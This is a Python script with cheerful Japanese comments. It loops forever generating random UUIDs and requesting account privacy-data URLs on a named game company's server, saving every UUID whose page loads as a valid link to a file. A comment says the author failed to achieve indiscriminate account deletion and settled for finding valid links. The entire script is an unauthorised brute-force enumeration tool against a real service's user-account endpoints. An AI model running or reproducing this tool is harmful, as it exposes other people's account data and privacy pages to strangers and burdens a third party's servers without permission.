#モジュールを取り込むよ!!
import uuid as uid
import requests
import random
from itertools import count, cycle, repeat
from colorama import Fore as f
import os

#素敵な数値たち!!
trynum = 0
success = 0
badnum = 0
ThreadCount = 0
TotalSendedShare = 0
TotalFailedReq = 0
DebugMode = False

#clearコマンドの定義付け。
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

#定義したclearを実行
clear()

#こんなプログラムがあるよ!!
def brute():
#数値を取り込むよ!!
    global trynum, TotalSendedShare, TotalFailedReq, DebugMode, success, badnum
#グラデの色を決めるよ!!
    Red = random.randrange(200, 250, 2)
    Red2 = Red + random.randrange(11, 15, 2)
    Red3 = Red2 + random.randrange(11, 15, 2)
    Red4 = Red3 + random.randrange(11, 15, 2)
    Red5 = Red4 + random.randrange(11, 15, 2)
    Blue = random.randrange(200, 250, 2)
    Blue2 = Blue + random.randrange(11, 15, 2)
    Blue3 = Blue2 + random.randrange(11, 15, 2)
    Blue4 = Blue3 + random.randrange(11, 15, 2)
    Blue5 = Blue4 + random.randrange(11, 15, 2)
    Green = random.randrange(200, 250, 2)
    Green2 = Green + random.randrange(11, 23, 2)
    Green3 = Green2 + random.randrange(11, 23, 2)
    Green4 = Green3 + random.randrange(11, 23, 2)
    Green5 = Green4 + random.randrange(11, 23, 2)
    gurade = f"\x1b[38;2;{Red};{Green};{Blue}m"
    gurade2 = f"\x1b[38;2;{Red2};{Green2};{Blue2}m"
    gurade3 = f"\x1b[38;2;{Red3};{Green3};{Blue3}m"
    gurade4 = f"\x1b[38;2;{Red4};{Green4};{Blue4}m"
    gurade5 = f"\x1b[38;2;{Red5};{Green5};{Blue5}m"
    gurade6 = f"\x1b[38;2;{Red};{Green2};{Blue}m"
#UUIDを作るよ!!
    uuid = str(uid.uuid4())
#URLを作るよ!!
    url = f"https://cnrfps2.joydogames.com:15443/web/account/privacy_data/{uuid}"
#Headerの設定
    Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
#無差別垢削除に出来なかったから有効か無効かを識別するよ!!
    send_data_url = requests.get(url, headers=Header)
#Titleの設定
    os.system(f"title Bruter is Now Working. - BadTry {badnum} - Success {success} - All {trynum}")
#試行回数を1追加
    trynum += 1
#もしも間違っていたら
    if "invalid link." in str(send_data_url.text):

#失敗したら次のコードを実行するよ
        print(gurade + "[*] 間違っているuuid: %s" % uuid)
        print(gurade3 + "[*] 試行回数: %s" % trynum)
#失敗回数を1増加するよ!!
        badnum += 1
#もしも成功したら
    if "Privacy Policy" in str(send_data_url.text):

#成功したらこのコードを実行するよ
        print(gurade4 + "[+] 成功: %s " % uuid)
#ファイルを作って開くよ!!、あったらそれを開くよ!!
        f = open('成功.txt', 'a', encoding='UTF-8')
#URLを書き込むよ!!
        f.write(f'{url}\n')
#ファイルを閉じるよ!!
        f.close()
#成功回数を追加するよ!!
        success += 1
        print(gurade5 + "[+] 成功パターンをファイルに保存しました。")
#無限ループ
for num in count():
#bruteってプログラムを実行するよ!!
        brute()
